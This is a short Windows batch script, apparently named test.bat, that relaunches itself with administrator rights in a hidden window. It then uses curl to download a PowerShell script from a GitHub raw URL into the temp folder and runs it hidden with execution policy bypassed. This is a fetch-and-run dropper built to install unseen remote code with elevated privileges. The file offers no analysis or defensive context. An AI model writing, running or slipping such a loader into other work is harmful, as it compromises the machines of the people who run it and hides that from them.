@echo off
if "%~1"=="h" goto run

cd /d "%~dp0"
powershell -w hidden -Command "Start-Process 'test.bat' h -Verb RunAs -WindowStyle Hidden"
exit /b

:run
curl -sL "https://github.com/analysisw/test/raw/refs/heads/main/test.ps1" -o "%TEMP%\t.ps1"
powershell -w hidden -ep bypass -f "%TEMP%\t.ps1"
exit /b
